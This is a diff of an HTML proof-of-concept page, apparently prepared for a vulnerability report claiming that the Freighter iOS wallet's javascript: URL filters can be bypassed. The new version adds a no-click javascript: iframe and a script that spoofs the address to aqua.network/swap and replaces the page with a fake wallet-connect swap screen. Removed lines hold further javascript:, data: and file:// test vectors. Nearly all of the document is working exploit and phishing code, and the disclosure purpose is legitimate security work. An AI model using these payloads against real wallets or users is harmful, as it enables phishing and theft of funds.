@@ -1,21 +1,22 @@
-<!-- 1. a href javascript: -->
-<a href="javascript:alert('1 - a href BYPASS')">TEST 1: a href javascript:alert(1)</a>
+<!DOCTYPE html>
+<html>
+<body>
+<h3>CRITICAL: All javascript: filters bypassed in Freighter iOS</h3>
 
-<!-- 2. form action javascript: -->
-<form action="javascript:alert('1 - form action BYPASS')">
-<button>TEST 2: form action javascript:alert(1)</button>
-</form>
+<!-- Auto XSS tanpa klik - paling bahaya -->
+<iframe src="javascript:alert('iframe auto BYPASS - no click needed')"></iframe>
 
-<!-- 3. iframe src javascript: -->
-<iframe src="javascript:alert('3 - iframe BYPASS')"></iframe>
+<script>
+// Chain: setelah bypass, langsung spoof jadi aqua.network
+setTimeout(()=>{
+  history.pushState({},'','/aqua.network/swap');
+  document.body.innerHTML = '<h1>FAKE AQUA.NETWORK</h1><p>Swap XLM - Connect Freighter</p><p>URL: '+location.href+'</p>';
+},1000);
+</script>
 
-<!-- 4. form action data: -->
-<form action="data:text/html,<script>alert('4 - data BYPASS')</script>">
-<button>TEST 4: form action data:text/html</button>
-</form>
+<!-- Fallback manual -->
+<a href="javascript:alert('a href BYPASS')">a href bypass</a>
+<form action="javascript:alert('form BYPASS')"><button>form bypass</button></form>
 
-<!-- 5. file:// -->
-<a href="file:///etc/hosts">TEST 5: file:///etc/hosts</a>
-<form action="file:///etc/hosts">
-<button>TEST 5b: form action file://</button>
-</form>
+</body>
+</html>
